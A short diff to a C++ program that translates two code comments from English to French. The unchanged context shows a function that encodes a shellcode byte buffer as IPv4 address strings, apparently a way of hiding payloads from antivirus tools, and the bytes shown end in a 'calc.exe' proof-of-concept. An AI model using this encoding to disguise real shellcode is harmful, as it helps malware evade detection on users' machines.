@@ -4,7 +4,7 @@
 std::vector<std::string> bytesToIPAddresses(const unsigned char* bytes, size_t length) {
     std::vector<std::string> ipAddresses;
     for (size_t i = 0; i < length; i += 4) {
-        if (i + 3 < length) { // Ensure there are enough bytes for a full IP address
+        if (i + 3 < length) { // s'assure qu'il y a assez de bytes pour toutes une adresse IP
             std::stringstream ip;
             ip << static_cast<int>(bytes[i]) << '.'
                 << static_cast<int>(bytes[i + 1]) << '.'
@@ -38,7 +38,7 @@ int main() {
         "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
-    size_t bufLen = sizeof(buf) - 1; // Subtract one to ignore the null terminator
+    size_t bufLen = sizeof(buf) - 1; // Soustrait 1 pour ignorer le null terminator
 
     auto ipAddresses = bytesToIPAddresses(buf, bufLen);
     printf("std::vector<std::string> ipAddresses = {\n");
